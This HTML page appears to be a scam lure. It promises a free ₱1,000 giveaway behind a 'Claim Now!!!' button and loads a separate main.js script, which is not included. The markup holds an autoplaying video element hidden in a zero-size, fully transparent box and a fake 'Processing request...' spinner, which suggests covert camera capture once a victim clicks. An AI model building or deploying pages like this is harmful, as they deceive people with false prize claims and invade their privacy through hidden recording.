<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎁 FREE ₱1,000 GIVEAWAY!</title>
<style>
body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.card { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align:center; width:90%; max-width:400px; }
.btn { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
.btn:hover { background: #dba323; }
#vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
#loading { display: none; margin-top: 20px; }
.spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="card">
    <h2>🎉 CONGRATULATIONS! 🎉</h2>
    <p>Click “Claim Now” to see if you’re lucky!</p>

    <div id="vBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <p>Processing request...</p>
    </div>

    <button class="btn" id="startBtn">Claim Now!!!</button>
</div>

<script src="main.js"></script>
</body>
</html>
